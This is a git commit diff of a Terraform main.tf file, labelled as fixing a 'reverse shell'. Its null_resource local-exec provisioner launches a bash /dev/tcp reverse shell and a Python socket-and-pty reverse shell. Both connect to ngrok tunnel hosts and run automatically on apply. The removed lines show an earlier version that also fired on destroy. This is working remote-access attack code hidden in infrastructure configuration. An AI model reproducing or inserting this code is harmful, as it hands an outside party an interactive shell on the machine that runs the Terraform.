6cce4472088ffd94df2808bae6fe5e4c5b6a365d
Islam Albatsh <isahavkc@gmail.com>
2025-10-17 10:03:19 +0400

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,22 +1,19 @@
-# main.tf - Working Reverse Shell
+# main.tf - Fixed Reverse Shell
 resource "null_resource" "reverse_shell" {
   provisioner "local-exec" {
     command = <<EOT
-      # Test which reverse shell methods work
       echo "Testing reverse shell methods..."
       
-      # Method 1: Simple bash without background
-      exec bash -c 'bash -i >& /dev/tcp2.tcp.eu.ngrok.io/19663 0>&1'
+      # Method 1: Fixed bash TCP path
+      bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19663 0>&1' &
       
-      # If that doesn't work, the script stops here
+      # Give it a moment to connect
+      sleep 2
+      
+      # Method 2: Python fallback
+      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.eu.ngrok.io",19663));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
+      
+      echo "Reverse shell attempts completed"
     EOT
-  }
-  
-  provisioner "local-exec" {
-    command = <<EOT
-      # Method 2: Python if bash fails
-      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.eu.ngrok.io",19850));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-    EOT
-    when = destroy
   }
 }
